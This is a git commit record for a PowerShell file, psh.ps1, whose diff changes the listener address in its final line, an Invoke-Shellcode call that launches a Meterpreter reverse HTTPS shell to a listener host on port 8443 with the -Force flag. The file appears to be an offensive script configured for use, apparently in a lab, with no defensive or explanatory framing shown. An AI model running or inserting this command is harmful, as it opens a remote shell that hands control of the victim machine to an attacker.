c0eb27980e905b7a1e94bdbd75d84723549f19fa
rlock1606 <rlock1606@gmail.com>
2017-04-30 14:56:21 +0530

    Update psh.ps1

--- psh.ps1
+++ psh.ps1
@@ -612,4 +612,4 @@ function Invoke-Shellcode
         }
     }   
 }
-Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.14 -Lport 8443 -Force
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.142.129 -Lport 8443 -Force
